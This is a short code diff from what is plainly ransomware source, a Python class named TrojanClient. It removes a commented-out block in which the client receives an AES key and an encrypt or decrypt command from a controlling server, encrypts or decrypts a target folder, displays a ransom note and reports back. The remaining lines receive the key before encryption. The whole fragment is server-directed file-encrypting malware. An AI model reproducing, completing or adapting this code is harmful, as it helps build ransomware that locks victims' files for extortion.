@@ -138,28 +138,6 @@ class TrojanClient:
         protocol.send(self.connection, "the files are decrypted")
 
     def handle_server(self):
-        # option 1:
-        
-        # aes_key = protocol.receive(self.connection)
-        # action = protocol.receive(self.connection).decode("utf-8")
-
-        # if action == "encrypt":
-        #     FileEncryptor.encrypt_folder(self.folder, aes_key)
-        #     del aes_key
-        #     RansomNote.display_encryption_note()
-        #     protocol.send(self.connection, "the files are encrypted")
-
-        # elif action == "decrypt":
-        #     FileEncryptor.decrypt_folder(self.folder, aes_key)
-        #     del aes_key
-        #     RansomNote.display_decryption_note()
-        #     protocol.send(self.connection, "the files are decrypted")
-
-        # sys.exit()
-
-
-
-        # option 2:
         aes_key = protocol.receive(self.connection)
         
         # encryption
